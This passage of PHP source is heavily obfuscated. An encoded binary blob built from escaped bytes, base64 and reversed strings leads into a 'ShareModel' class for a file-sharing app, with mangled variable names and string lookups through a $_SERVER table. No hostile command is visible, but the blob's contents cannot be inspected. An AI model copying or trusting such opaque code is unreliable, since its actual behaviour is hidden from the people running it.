ĞŒM/')."\xeb\x73\x5a\x72\x80\xa5\x72\xe0\xb4\x1c\x1\xaa\xff\xe4\x28\xcd\xa3\x78\xae\x51\x8d\x99\x88\x32\x49\x43\x4f\x57\x8f\x9f\x47\xb5\xf2\xed\x49\xb9\x53\xe1\x67\xa9\x8d\x29\x19\x89\xf7\xde\x47\xb"."\x7a\x4a\x9\x47\x3b\x43\x6d\x81\x70\x7b\x28\xbe\x42\xc9\x6a\xb6\x22\x54\x20\xc8\xcb\xd\xce\xad\x4c\x4\x6b\x74\xe2\x19\x54\xf\xf2\x47\x4\xf0\xa7\x77\x10\x51\xac\xde\x34\x27\xdc\x2d\x41\xa2".strrev('ÈÒ®P*Xô]°yãüÊµ2\\ÊLô…çrU…Åƒ(¯‘ùlEEfiü)jÎMkÒ`ZK')."\137\275\5\362\322\203\234\33\35\304\132\161\262\316\353\305\21\335\322\305\306\147\45\306\345\332\3\355\335\241\110\62\20\16\43\366\136\326\226\23\202\122\223\277\253\221\226\237"."\341\220\126\106\54\2\155\275\322\375\27\70\117\222\275\241\273\70\165\272\174\262\33\270\22\23\373\303\273\203\334\53\77\15\112\157\352\224\114\125\267\64\51\202\76\365\62\13"."\xc\x2d\xd4\x7c\xde\xf1\x9a\x5e\x3e\x23\x5\xcb\xce\x93\xb5\x6a\x53\x49\xda\x0\x8b\x93\x3c\xcd\x55\xcb\x10\xc3\xcf\xa4\xff\x8f\xbb\xaa\xa7\x85\xc7\x27\x3d\xcd\xb4\xf\xb8\x5d\x1c\x75\xd8\xdf".base64_decode('Jr+8yNqseDfoS18g8oiLkiTxnsMeQjMIOQ60Io0LRZPUiYxoAjGK5nhJvqnyp/18')."\212\351\7\166\154\27\144\42\153\34\20\204\61\316\16\265\341\346\50\273\204\270\100\54\327\141\44\64\323\176\104\170\2\346\331\161\123\353\172\113\311\255\34\352\170\274\274\242"."\15\342\266\237\246\365\341\341\240\234\3\142\160\50\304\37\341\20\105\335\51\125\72\200\222\25\41\66\341\31\224\26\245\201\76\353\305\237\125\120\226\60\53\137\321\0\161\105"."\x15\x2c\x94\x6c\x7\x2b\xd9\x25\x6b\x85\x4b\x6b\x43\x23\x8\xa5\x23\x58\x5\xac\x43\x63\x14\xc6\x2b\x22\x1c\xb2\x92\x30\xeb\x17\x57\xc6\xc3\x8f\x4a\x14\x33\x86\x3c\x7f\x4\x21\x63\x15\x7f\xfa"."\x38\x1f\xe5\x59\x3d\x88\xd6\xd7\xec\xca\xb7\x79\x68\xf1\xff\x93\x82\x34\x31\x2e\xa9\x28\x3a\x2b\xa9\xec\x90\xe5\x3e\xea\x4\xd9\x85\x9f\x1d\xca\x19\xa3\xce\x17\xfa\x70\x8c\xfb\xa1\x21\xc7\x13"."\x43\xd2\xa6\x21\xc6\xa8\xf2\xa3\x48\xce\x42\x9e\x8a\xc7\x3d\x14\xf2\xf4\xaa\x82\x40\x1d\x56\x11\x7b\x30\x62\x3c\x11\xc9\x2c\x35\x3d\x83\xfe\xf4\xc3\x2f\x3b\xce\xdc\x9d\xa0\x88\xa\x9a\xac\xe7"."\100\325\226\323\363\151\223\53\205\210\210\156\115\60\252\244\24\326\213\120\331\23\263\344\275\262\166\206\223\341\75\221\152\117\121\141\267\162\316\7\122\304\273\63\342\354\164\276".base64_decode('zMGvNi2xGSzb8fJLwkioWQ+lyDBWE6HWcflbVhAlo0CJTJiU5uu9VMrAHnxLe8hr')."\144\24\325\271\37\54\221\166\32\307\237\162\351\154\336\30\124\363\61\252\113\345\60\10\61\21\67\305\365\43\35\331\150\224\137\55\225\304\325\213\174\144\242\277\16\243\71\110"."\353\115\164\45\211\351\167\222\336\325\306\5\314\111\227\66\64\22\56\160\312\305\20\25\164\73\142\115\211\317\223\225\173\351\125\225\260\316\202\354\250\237\75\364\156\12\46\114".base64_decode('rpLdF3Kpa4f0FLm/8n4Ra4kBRpGVKOGq1yczYpBBWaII0HBsZAxKiBr2kA+CKWTC')."\375\13\142\71\4\73\37\303\241\240\116\176\332\265\14\347\142\160\130\234\346\262\277\12\241\127\340\176\317\215\65\303\237\243\363\320\221\211\147\110\351\343\163\36\376\320\234\207"."\x7a\x2f\xf4\xc0\xf3\x72\x1e\x61\x65\xf7\x45\xef\xe9\x88\x17\x86\x9d\xcf\x12\xe3\x3e\x73\xad\xc3\xa\x76\xc2\xcd\x49\xf0\xa9\x72\x15\x88\xb9\x27\x2e\x61\x54\xca\x1c\xc5\xad\x6a\xb1\x5c\x10\xf7"."\324\50\340\344\254\52\6\54\215\260\154\346\75\344\116\331\303\274\270\271\246\103\214\112\136\231\52\163\370\345\165\120\345\123\302\56\245\235\370\252\171\311\240\311\356\345\334\331".base64_decode('dAfUJU1NWJtQX5oVqH1NId00Z94iWSwh1kfcXoG5O9y2AZ0hVlxxwpPCHHjK+5Yk')."\x3a\xf5\x82\x2b\xdf\x81\x74\xe1\xee\xff\x19\xe4\xb\xba\x9f\x66\x95\xb4\x74\x2b\xdf\xd3\xad\x98\x1\x2\x84\x92\xfe\x8a\x74\x94\xb9\x94\x15\xc\xac\x43\x60\x89\xed\x43\xf\x2f\xf1\xfa\xa3\xb3".base64_decode('LXrwVxmHdGKJnUAf5zPymDsuYKmvbapOVrAax0NmgrFXOnkjW3P3nUwMyEFEssQS')."\311\65\332\206\133\210\203\213\343\23\215\310\20\243\305\74\34\270\330\172\130\354\51\11\245\374\17\26\220\161\67\224\21\22\252\52\125\106\356\77\212\341\215\52\217\57\112\367"."\xfd\x5f\xd0\x6f\x4a\x97\x71\x4e\xce\xab\xda\x5e\x9\x20\x25\xc1\x9f\x66\x47\xc9\x2\x3\xdd\x22\x18\x4e\xe7\x58\x5d\xd5\xa3\x62\xa2\x8e\x1\x8f\x32\x59\xa6\x4a\xe2\x4c\x7a\xa3\x51\xf8\x97\x92".strrev('&ÀAó""ã–«*'."\r".'¼‘R-»eqnJ·c¨wAãçi>¿$ä3¯ÂN)™š\\2È').strrev('M—°~ä¬óo]Û…¾ëQIne|c¬Å¿ÕzWg„®S‘z’©ğÛ“ ^½‰3n')."\x11\x41\x5\x2\xcb\x49\xa6\xa1\xe\x26\x84\x3f\x58\xe6\x60\x4a\x2c\xf7\x9b\x84\x88\x34\x93\x1d\x6\xa3\x20\xdf\x4\x70\x9c\x2\x3a\x24\x7a\xdc\xb4\x35\xe9\xb4\x14\x7\xa3\xf8\x8a\x94\xb\x22"."\40\11\143\11\377\303\23\35\26\264\330\117\222\153\347\63\273\134\313\365\102\51\165\372\112\277\31\231\376\177\375\10\337\377\253\267\367\346\65\60\261\271\343\205\337\116\40\226"."\x19\x7d\x36\x21\xb9\x8b\xa6\x22\x5b\xd7\x38\x9c\x87\xe6\x54\x80\x22\xfe\x98\xb5\x14\xe6\xca\xaa\xcc\x57\x16\x73\xa1\xa5\xb2\x6b\x1e\x35\x9f\x97\x8e\xd6\xea\xec\x45\xc5\xd3\xa8\x8\xf8\x86\xf8".strrev('h›"£"%–Î…zñ:o+¼F(Ó'."\n".'¦.póŒµ@êòqÁì}©3÷1cnÕš»')."\321\42\314\355\230\237\175\245\60\303\206\51\121\206\146\145\53\321\150\211\261\166\365\200\331\7\216\142\350\210\330\235\3\126\222\61\221\43\252\2\177\45\34\253\340\210\224\47"."\x18\x56\xd\x1b\xd6\x3a\x9f\xa7\x87\x12\xdd\xae\x67\x1e\x69\x26\x4b\x9e\x4d\x87\x70\xbd\xf2\xe2\xbb\xb2\x34\xdf\xf9\x72\x11\xac\x15\xec\x94\x37\xf1\xa7\xbd\x1b\xdc\x6f\x7d\x37\x7a\x2b\x1b\xa3".base64_decode('SvlY5BHDQgYmNiL3L+R+tEoZCqlxkWeSvVJ9x/LnNYUMDX/J42U7v8c0CEHnjOWC')."\x17\x49\x21\x53\x7a\x7c\x7a\x86\xf4\x6e\xac\x68\xa2\xe2\xe9\x57\xd7\xed\x6\xe2\xb9\xc4\x75\x9f\x6e\x10\xff\xeb\x50\x51\xbc\xb7\xbb\x8e\x58\x9b\xb0\x83\x5d\x3c\xec\x8c\xb7\x94\xf0\x70\x88\xe5".base64_decode('4h0GhxHsnopI/uQznBmASfrTEOWQz1nyUxfOklgj3rmzllbLljJMS8rG46vlxfAm').strrev('ç7+¤„Æùš$‰ äß;Nôˆ–IG+#pÛğvÑ”åpŸBíßJáXí¯&ü4äË')."\215\47\167\61\136\201\67\313\172\130\112\46\245\230\313\65\364\213\215\344\102\302\113\3\111\246\227\11\1\351\271\147\167\51\347\63\341\322\375\150\212\300\141\260\362\12\114\334"."\xcc\x49\x54\x7\x2b\x86\xf9\x22\x71\x20\xb8\xe2\xab\x3d\x74\x9d\x51\x47\x4\xc9\x24\x28\xf3\x74\x9a\x3f\x42\xef\xc8\x9a\x66\xbc\x9\x8f\x45\x31\xe2\xbd\x7a\x4c\x72\x49\x76\xb7\x42\x9d\x5b\x1b"."\x75\xbf\xfc\xeb\x93\x6d\x75\x1d\x19\x2b\x63\x85\x5d\xae\x54\x5e\x5c\x86\x88\x61\xe2\xb8\x6a\xc3\x27\xdb\xc9\x59\x5c\xb6\xfb\xe5\x40\x25\xa2\xe8\xab\xa\x5c\x9b\x48\xe2\x82\xb0\x59\x82\x50\x33"."\xa2\x43\xe1\x2c\xbd\x68\xd2\x69\x65\xcc\xb3\xf1\x35\x43\x79\x88\x11\x88\xd7\x11\xeb\xe2\xeb\xb0\x80\x84\xd1\xf\xae\x24\x90\x27\x48\xd5\x57\x15\x3b\x48\x20\xa0\xe5\xc3\x52\x75\xf2\x95\xe8\xa4"."\x5\xe2\xd5\x1b\x11\x50\xe9\x9c\x62\xc9\x6c\x5b\x24\xb0\x83\xcf\x70\x4c\xbe\x84\x22\xf9\xc0\x20\x67\x4c\x4e\x74\x74\xc7\xbd\xb4\x84\x25\x11\xe0\x4b\x23\xb\x44\x1c\x4b\xd3\x2\xce\x24\x9a\x5f".strrev('ª=¡”ª0‘W¤è©*(÷7S›îëûÕCB¤Åfñ•‰•Iñ\'*vêa-à.^õs').base64_decode('Wowm4ZKCeHWUnWQKcFmahMtWJLPCkrBFKmerZWuS4VVOHkgg0lUG7OLTadbJ5rNq').base64_decode('5srmAOLcuYnIonovhKTBdb9drRdVM0/aC5HbdQpUw7UspQp2FYoOlXhcpFVRu6B1').base64_decode('4jNaduNUJVnW4aiu5RGruvUtp/qFK16eGPDYCdQVQBviG/P6kNBIYwrUMxz4vVwc')."\52\32\374\314\110\13\355\71\254\352\33\60\335\23\131\121\233\23\116\213\145\311\11\152\125\175\156\17\346\362\53\371\351\274\312\44\370\222\42\74\145\200\14\133\117\151\116\117".base64_decode('q7I3J5rOGslLkkKXkE7IHBzqAVXEWCQK6DohDKf1SRSLgAmHAQKlE+CCgN4ttuE7').base64_decode('bH6rRLyE0nOVJscN0/bgtIRRIr+thm2Lu3bK5BNiEB+OHkmVBH2JKyTcKXI3QcCW')."\240\27\362\11\267\234\230\173\216\153\64\225\40\45\107\0\337\171\360\200\174\366\301\155\147\107\331\165\37\53\42\20\253\72\150\214\61\37\214\330\260\131\364\7\137\123\110\123"."\46\350\23\0\77\131\31\206\230\214\133\176\232\342\7\337\375\136\25\23\212\360\322\227\157\135\51\353\50\116\337\113\342\12\236\137\124\3\310\124\105\25\324\161\67\221\174\201"."\xa5\x48\x3c\x11\xaf\x48\xea\x9\xc4\xe3\xab\xa2\xb1\x76\xea\xe7\xbb\x22\x99\x94\x92\x94\x8b\x2a\x92\x7a\xba\xa2\x91\xc9\xd2\x82\xdd\x81\x50\xb8\x22\xd\xeb\x21\x45\x92\xc2\xe1\x16\x4d\xa\xf5"."\x90\x5e\x92\xcb\xbc\xc9\x7a\x11\x6a\x5b\x21\x7a\x42\xae\x8d\x85\xa8\xbe\x94\x33\x98\x4\x9e\x5d\x65\xc4\xd5\x3c\xe3\xd9\x25\x3b\x48\xad\x20\x3c\xaf\x89\x32\x45\x3d\x35\x24\x44\x7d\xaa\x44\xbc"."\133\314\51\41\377\160\76\232\343\122\367\143\100\12\25\141\35\242\10\324\35\53\101\54\366\173\316\367\72\47\244\305\75\270\317\161\137\56\305\223\375\100\20\214\4\163\362\101".base64_decode('SyJmVZ0gWcxbee1AUsUE4I4tZ2/+rjMGpWsFysaALSJMqaQnRr8dybaarXptTGV7')."\x78\xc7\xb\xa9\xdb\xff\x6\x52\xbf\x4d\x9c\x3d\xaa\x0\x0"."".base64_decode('').strrev(''), 10, -8))); goto AÇÁ¬õÇç; B¿œ­áÔÊ: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\x54\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\x74\54\x75\160\144\141\x74\x65", "\x66\165\156\x63\x74\x69\157\x6e"), array("\x63\x72\145\141\x74\x65\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\x73\145\x72\x74", "\x66\x75\x6e\143\164\x69\157\156"), array("\x6f\160\164\151\x6f\156\163", '', "\151\156\x73\x65\x72\x74\54\165\x70\144\x61\x74\145\54\163\145\154\145\143\x74", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¹óíèÑƒ) { $¬§ö =& $_SERVER[ñˆ‹ß¿÷]; $Ô´Ş††Ú = isset($¹óíèÑƒ[0]) ? $¹óíèÑƒ[0] : !1; return array($¬§ö[1975] => array(USER_ID, $¬§ö[1976]), $¬§ö[1916] => array($Ô´Ş††Ú, $¬§ö[1977])); } protected function listSimple() { $Ú¨×Ú‰– = array($_SERVER[ñˆ‹ß¿÷][1664] => USER_ID); $ß«‚İõú = $this->field($this->fieldList)->where($Ú¨×Ú‰–)->select(); return $ß«‚İõú ? $ß«‚İõú : array(); } protected function getInfo($ƒ¤„, $×¬ÈÊÛ› = false) { $ÆÀöÁÂ =& $_SERVER[ñˆ‹ß¿÷]; if ($×¬ÈÊÛ›) { return $this->_getShareInfo(array($ÆÀöÁÂ[489] => $ƒ¤„)); } $‘ ê˜€ = $this->cacheFunctionGet($ÆÀöÁÂ[1918], $ƒ¤„); return $‘ ê˜€; } public function getInfoByHash($éÈ­°ö) { return $this->_getShareInfo(array($_SERVER[ñˆ‹ß¿÷][491] => $éÈ­°ö)); } public function getInfoByPath($½¨†‡œ) { $Œ®ßõë =& $_SERVER[ñˆ‹ß¿÷]; $Ù©ØÛÄç = array($Œ®ßõë[1664] => USER_ID, $Œ®ßõë[402] => $½¨†‡œ); return $this->_getShareInfo($Ù©ØÛÄç); } public function getInfoBySourcePath($ıÄîÑ…) { $íË£øÓ =& $_SERVER[ñˆ‹ß¿÷]; $“û§§Ş¯ = array($íË£øÓ[1664] => USER_ID, $íË£øÓ[1183] => $ıÄîÑ…); return $this->_getShareInfo($“û§§Ş¯); } private function _getShareInfo($ÅıÔó½Æ) { $¡òçúÚ› =& $_SERVER[ñˆ‹ß¿÷]; $ø£Õè÷Õ = $this->where($ÅıÔó½Æ)->find(); if (!$ø£Õè÷Õ) { return !1; } $ÅıÔó½Æ = array($¡òçúÚ›[489] => $ø£Õè÷Õ[$¡òçúÚ›[489]]); $¤ø™”–ö = $¡òçúÚ›[1978]; $È„û£ = Model($¡òçúÚ›[602])->order($¡òçúÚ›[399])->field($¤ø™”–ö)->where($ÅıÔó½Æ)->select(); if ($ø£Õè÷Õ[$¡òçúÚ›[402]] == $¡òçúÚ›[197]) { $ø£Õè÷Õ[$¡òçúÚ›[86]] = IO::info($ø£Õè÷Õ[$¡òçúÚ›[1183]]); } else { $ø£Õè÷Õ[$¡òçúÚ›[86]] = Model($¡òçúÚ›[1334])->pathInfo($ø£Õè÷Õ[$¡òçúÚ›[402]]); } $ø£Õè÷Õ[$¡òçúÚ›[1979]] = $È„û£; return $ø£Õè÷Õ; } protected function getInfoAuth($Ñ”÷¤Ü–) { $ÅˆÑÁ°õ =& $_SERVER[ñˆ‹ß¿÷]; $ª’ñæŞ = $this->getInfo($Ñ”÷¤Ü–); if ($ª’ñæŞ[$ÅˆÑÁ°õ[1664]] == USER_ID) { $ª’ñæŞ[$ÅˆÑÁ°õ[413]] = $ª’ñæŞ[$ÅˆÑÁ°õ[86]][$ÅˆÑÁ°õ[413]]; } else { $ª’ñæŞ[$ÅˆÑÁ°õ[413]] = Model($ÅˆÑÁ°õ[502])->authMake($ª’ñæŞ[$ÅˆÑÁ°õ[1979]]); } return $ª’ñæŞ; } protected function listData($¢¸§±´ = null, $÷Á¸¤åË = 300) { $ëÊŞÔæÍ =& $_SERVER[ñˆ‹ß¿÷]; $¿âÄÄ–† = array(array($ëÊŞÔæÍ[494] => array($ëÊŞÔæÍ[1019], 0), $ëÊŞÔæÍ[496] => array($ëÊŞÔæÍ[1019], 0), $ëÊŞÔæÍ[1980] => $ëÊŞÔæÍ[1934])); if ($¢¸§±´ == $ëÊŞÔæÍ[1981]) { $¿âÄÄ–† = array($ëÊŞÔæÍ[494] => 1); } else { if ($¢¸§±´ == $ëÊŞÔæÍ[1168]) { $¿âÄÄ–† = array($ëÊŞÔæÍ[496] => 1); } } $¿âÄÄ–†[$ëÊŞÔæÍ[1664]] = USER_ID; $¹Á‘ÕØÊ = $this->where($¿âÄÄ–†)->selectPage($÷Á¸¤åË); return $¹Á‘ÕØÊ; } protected function listToMe($„ñ°ú£ = 300) { $ö øŒÔ =& $_SERVER[ñˆ‹ß¿÷]; $ñÄÉĞÆ = Model($ö øŒÔ[1982])->userGroupParents(USER_ID); $Å­ÁÛâ÷ = array($ö øŒÔ[586] => SourceModel::TYPE_USER, $ö øŒÔ[505] => USER_ID); if ($ñÄÉĞÆ) { $Å­ÁÛâ÷ = array(array($ö øŒÔ[586] => SourceModel::TYPE_USER, $ö øŒÔ[505] => USER_ID), array($ö øŒÔ[586] => SourceModel::TYPE_GROUP, $ö øŒÔ[505] => array($ö øŒÔ[7], $ñÄÉĞÆ)), $ö øŒÔ[1980] => $ö øŒÔ[1934]); } $ÙÙçä¥ = Model($ö øŒÔ[602])->where($Å­ÁÛâ÷)->selectPage($„ñ°ú£); $¾èİ ½‹ = array_to_keyvalue_group($ÙÙçä¥[$ö øŒÔ[369]], $ö øŒÔ[489]); if (!$¾èİ ½‹) { return $ÙÙçä¥; } $¨–¯Ó‘ë = $ö øŒÔ[1983]; $Å­ÁÛâ÷ = array($ö øŒÔ[489] => array($ö øŒÔ[418], array_keys($¾èİ ½‹)), $ö øŒÔ[1664] => array($ö øŒÔ[1021], $ö øŒÔ[197])); $¶“ÁÙ«• = $this->field($¨–¯Ó‘ë)->where($Å­ÁÛâ÷)->select(); foreach ($¶“ÁÙ«• as $¥Şé•Æ => &$»ç£™Ï) { $»ç£™Ï[$ö øŒÔ[1979]] = $¾èİ ½‹[$»ç£™Ï[$ö øŒÔ[489]]]; } unset($»ç£™Ï); $¸ÎæÊÄ® = array($ö øŒÔ[1984] => $¶“ÁÙ«•, $ö øŒÔ[1985] => $ÙÙçä¥[$ö øŒÔ[366]]); return $¸ÎæÊÄ®; } protected function shareAdd($Û…â€•, $ŠŞ¦‰æ) { $ŞµØ’‰ =& $_SERVER[ñˆ‹ß¿÷]; $‰·‚ÄÖ = $this->_addShareData($Û…â€•, $ŠŞ¦‰æ); if (!empty($ŠŞ¦‰æ[$ŞµØ’‰[1986]])) { $this->_shareAuthSet($‰·‚ÄÖ, $ŠŞ¦‰æ[$ŞµØ’‰[1986]]); } $this->shareEventAdd($Û…â€•, $ŠŞ¦‰æ, $ŞµØ’‰[1171]); return $‰·‚ÄÖ; } protected function shareAddSystem($ÅåÀß¡£, $”ÈâŞ…Ú) { $ø³•È²¹ =& $_SERVER[ñˆ‹ß¿÷]; $İôùÖø± = $this->_addShareData($ÅåÀß¡£, $”ÈâŞ…Ú, $ø³•È²¹[1283]); $this->_shareAuthSet($İôùÖø±, $”ÈâŞ…Ú[$ø³•È²¹[1986]]); return $İôùÖø±; } private function shareEventAdd($¦¨·›Ê“, $˜†òŠÃ², $‚¿¦ëÇ = "\x61\144\144") { $ô°ó£û­ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¦¨·›Ê“ || $¦¨·›Ê“ == $ô°ó£û­[197]) { return; } if ($‚¿¦ëÇ == $ô°ó£û­[1171]) { if ($˜†òŠÃ²[$ô°ó£û­[494]] == $ô°ó£û­[88]) { Model($ô°ó£û­[570])->eventShare($¦¨·›Ê“, $ô°ó£û­[1987]); } if ($˜†òŠÃ²[$ô°ó£û­[496]] == $ô°ó£û­[88]) { Model($ô°ó£û­[570])->eventShare($¦¨·›Ê“, $ô°ó£û­[1988]); } return; } $Êº¶«Üí = $this->getInfoByPath($¦¨·›Ê“); $³±ÈÀ‰† = $ô°ó£û­[1989]; if ($Êº¶«Üí[$ô°ó£û­[494]] == $ô°ó£û­[197] && $˜†òŠÃ²[$ô°ó£û­[494]] == $ô°ó£û­[88]) { $³±ÈÀ‰† = $ô°ó£û­[1987]; } if ($Êº¶«Üí[$ô°ó£û­[494]] == $ô°ó£û­[88] && $˜†òŠÃ²[$ô°ó£û­[494]] == $ô°ó£û­[197]) { $³±ÈÀ‰† = $ô°ó£û­[1990]; } if ($Êº¶«Üí[$ô°ó£û­[496]] == $ô°ó£û­[197] && $˜†òŠÃ²[$ô°ó£û­[496]] == $ô°ó£û­[88]) { $³±ÈÀ‰† = $ô°ó£û­[1988]; } if ($Êº¶«Üí[$ô°ó£û­[496]] == $ô°ó£û­[88] && $˜†òŠÃ²[$ô°ó£û­[496]] == $ô°ó£û­[197]) { $³±ÈÀ‰† = $ô°ó£û­[1991]; } Model($ô°ó£û­[570])->eventShare($¦¨·›Ê“, $³±ÈÀ‰†); return; } private function _addShareData($½³¨¹Å¯, $å›‘Í†Ç = array(), $£€ŠŸŸÒ = false) { $ÜÎœ±™ =& $_SERVER[ñˆ‹ß¿÷]; $÷ó¸Ë = $£€ŠŸŸÒ == $ÜÎœ±™[1283] ? 0 : USER_ID; $­»äüÙœ = array($ÜÎœ±™[417] => $½³¨¹Å¯, $ÜÎœ±™[1655] => $÷ó¸Ë); if ($½³¨¹Å¯ == 0) { $­»äüÙœ = array($ÜÎœ±™[1992] => $å›‘Í†Ç[$ÜÎœ±™[1183]], $ÜÎœ±™[1655] => $÷ó¸Ë); } if ($ÅÂ–Ö«İ = $this->where($­»äüÙœ)->find()) { return $ÅÂ–Ö«İ[$ÜÎœ±™[489]]; } if ($½³¨¹Å¯ == 0) { $±´õ„»à = array($ÜÎœ±™[32] => get_path_this($å›‘Í†Ç[$ÜÎœ±™[84]])); } else { $±´õ„»à = Model($ÜÎœ±™[832])->sourceInfo($½³¨¹Å¯); if (!$±´õ„»à) { return !1; } } if (!$å›‘Í†Ç[$ÜÎœ±™[1563]]) { $å›‘Í†Ç[$ÜÎœ±™[1563]] = $±´õ„»à[$ÜÎœ±™[32]]; } $œñÊ•« = array($ÜÎœ±™[1655] => $÷ó¸Ë, $ÜÎœ±™[417] => $½³¨¹Å¯, $ÜÎœ±™[1563] => $ÜÎœ±™[12], $ÜÎœ±™[494] => 0, $ÜÎœ±™[496] => 0, $ÜÎœ±™[1183] => $ÜÎœ±™[12], $ÜÎœ±™[307] => $ÜÎœ±™[12], $ÜÎœ±™[896] => $ÜÎœ±™[12], $ÜÎœ±™[1993] => 0, $ÜÎœ±™[1994] => 0, $ÜÎœ±™[497] => 0, $ÜÎœ±™[498] => $ÜÎœ±™[12], $ÜÎœ±™[491] => $ÜÎœ±™[12]); $¼êÈŠ´ş = explode($ÜÎœ±™[50], $ÜÎœ±™[1995]); foreach ($¼êÈŠ´ş as $–ÃãÄ˜) { if (!isset($å›‘Í†Ç[$–ÃãÄ˜])) { continue; } $œñÊ•«[$–ÃãÄ˜] = $å›‘Í†Ç[$–ÃãÄ˜]; } $×Àôíú† = $this->add($œñÊ•«); $Ú¾ÙÉÒ› = array($ÜÎœ±™[491] => short_id($×Àôíú†)); $this->where(array($ÜÎœ±™[488] => $×Àôíú†))->save($Ú¾ÙÉÒ›); return $×Àôíú†; } private function _shareAuthSet($ŞÂè¤…÷, $ŸÙæŒùâ) { $¢ÙŞˆê =& $_SERVER[ñˆ‹ß¿÷]; if (!is_array($ŸÙæŒùâ)) { return !1; } $´ãæ—ÅÏ = Model($¢ÙŞˆê[1944]); $´ãæ—ÅÏ->where(array($¢ÙŞˆê[489] => $ŞÂè¤…÷))->delete(); $â»– ¯æ = array(); foreach ($ŸÙæŒùâ as $ËÉğúÇ) { $ŒŒ¡õæ» = SourceModel::TYPE_USER; if ($ËÉğúÇ[$¢ÙŞˆê[411]] == SourceModel::TYPE_GROUP) { $ŒŒ¡õæ» = SourceModel::TYPE_GROUP; } $ëşµÚ…¯ = array($¢ÙŞˆê[489] => $ŞÂè¤…÷, $¢ÙŞˆê[411] => $ŒŒ¡õæ», $¢ÙŞˆê[505] => intval($ËÉğúÇ[$¢ÙŞˆê[505]]), $¢ÙŞˆê[1940] => 0, $¢ÙŞˆê[1996] => -1); if ($ËÉğúÇ[$¢ÙŞˆê[1940]]) { $ëşµÚ…¯[$¢ÙŞˆê[1940]] = $ËÉğúÇ[$¢ÙŞˆê[1940]]; } else { if ($ËÉğúÇ[$¢ÙŞˆê[1996]]) { $ëşµÚ…¯[$¢ÙŞˆê[1996]] = $ËÉğúÇ[$¢ÙŞˆê[1996]]; } } $â»– ¯æ[] = $ëşµÚ…¯; } return $´ãæ—ÅÏ->addAll($â»– ¯æ, array(), !0); } public function numViewAdd($š•İ°‹â) { $ÃÈÜš£ó =& $_SERVER[ñˆ‹ß¿÷]; $Œ†õ§õ = array($ÃÈÜš£ó[488] => $š•İ°‹â); $this->where($Œ†õ§õ)->setAdd($ÃÈÜš£ó[1993]); } public function numDownloadAdd($ùœã•ˆƒ) { $…èÌ¿ =& $_SERVER[ñˆ‹ß¿÷]; $—ğ­Ğìû = array($…èÌ¿[488] => $ùœã•ˆƒ); $this->where($—ğ­Ğìû)->setAdd($…èÌ¿[1994]); } protected function shareEdit($üåˆÃ¹Ë, $÷Ä¼œÜ¦) { $–ñ‘³®š =& $_SERVER[ñˆ‹ß¿÷]; $œÀã¶Õ = $this->getInfo($üåˆÃ¹Ë); if (!$œÀã¶Õ) { return !1; } $this->_checkLinkShare($÷Ä¼œÜ¦, $œÀã¶Õ); $îƒ‘æ› = array(); $ÒğÌ‚¦ï = explode($–ñ‘³®š[50], $–ñ‘³®š[1997]); foreach ($ÒğÌ‚¦ï as $‘–Û‹¥à) { if (!array_key_exists($‘–Û‹¥à, $÷Ä¼œÜ¦)) { continue; } $îƒ‘æ›[$‘–Û‹¥à] = $÷Ä¼œÜ¦[$‘–Û‹¥à]; } $this->shareEventAdd($œÀã¶Õ[$–ñ‘³®š[402]], $÷Ä¼œÜ¦, $–ñ‘³®š[1806]); $this->where(array($–ñ‘³®š[488] => $üåˆÃ¹Ë))->save($îƒ‘æ›); if (isset($÷Ä¼œÜ¦[$–ñ‘³®š[1986]])) { $this->_shareAuthSet($üåˆÃ¹Ë, $÷Ä¼œÜ¦[$–ñ‘³®š[1986]]); } return !0; } private function _checkLinkShare($öƒòğ, $Î¡Õû×‘) { $ÛàËÅÀ¿ =& $_SERVER[ñˆ‹ß¿÷]; if ($öƒòğ[$ÛàËÅÀ¿[494]] != $ÛàËÅÀ¿[88]) { return; } $‚È€íœÎ = $Î¡Õû×‘[$ÛàËÅÀ¿[86]][$ÛàËÅÀ¿[402]]; if ($Î¡Õû×‘[$ÛàËÅÀ¿[86]][$ÛàËÅÀ¿[33]] != $ÛàËÅÀ¿[199]) { $ÍÊŠè¼Ë = $this->_folderReport($‚È€íœÎ); if (!$ÍÊŠè¼Ë) { return; } show_json(LNG($ÛàËÅÀ¿[1998]) . $ÛàËÅÀ¿[1999] . $ÍÊŠè¼Ë, !1); } $ôĞ‡¬°µ = Model($ÛàËÅÀ¿[832])->fileInfoGet($Î¡Õû×‘[$ÛàËÅÀ¿[86]][$ÛàËÅÀ¿[402]]); if (!$ôĞ‡¬°µ) { return; } $ã÷©ú«Ò = $this->shareFileMeta($ôĞ‡¬°µ[$ÛàËÅÀ¿[468]]); if (isset($ã÷©ú«Ò[$ÛàËÅÀ¿[374]]) && $ã÷©ú«Ò[$ÛàËÅÀ¿[374]] == $ÛàËÅÀ¿[88]) { show_json(LNG($ÛàËÅÀ¿[2000]), !1); } } private function _folderReport($»“ƒ‰ƒ) { $ş•¿ÊÆİ =& $_SERVER[ñˆ‹ß¿÷]; $òÑ„”Üé = array($ş•¿ÊÆİ[468] => array($ş•¿ÊÆİ[1019], 0), $ş•¿ÊÆİ[757] => 3); $¤«ªûñ¿ = Model($ş•¿ÊÆİ[2001])->where($òÑ„”Üé)->field($ş•¿ÊÆİ[468])->select(); if (!$¤«ªûñ¿) { return !1; } $¤«ªûñ¿ = array_to_keyvalue($¤«ªûñ¿, $ş•¿ÊÆİ[12], $ş•¿ÊÆİ[468]); $Ã¼Àîô´ = $ş•¿ÊÆİ[50] . $»“ƒ‰ƒ . $ş•¿ÊÆİ[50]; $òÑ„”Üé = array($ş•¿ÊÆİ[468] => array($ş•¿ÊÆİ[7], $¤«ªûñ¿), $ş•¿ÊÆİ[521] => array($ş•¿ÊÆİ[383], "\45{$Ã¼Àîô´}\45"), $ş•¿ÊÆİ[431] => 0); $çÂ†¨Û© = Model($ş•¿ÊÆİ[832])->where($òÑ„”Üé)->field($ş•¿ÊÆİ[2002])->find(); if (!$çÂ†¨Û©) { return !1; } $“ùä“Û¢ = substr($çÂ†¨Û©[$ş•¿ÊÆİ[521]], strpos($çÂ†¨Û©[$ş•¿ÊÆİ[521]], $Ã¼Àîô´)); $òÑ„”Üé = array($ş•¿ÊÆİ[402] => array($ş•¿ÊÆİ[7], trim($“ùä“Û¢, $ş•¿ÊÆİ[50]))); 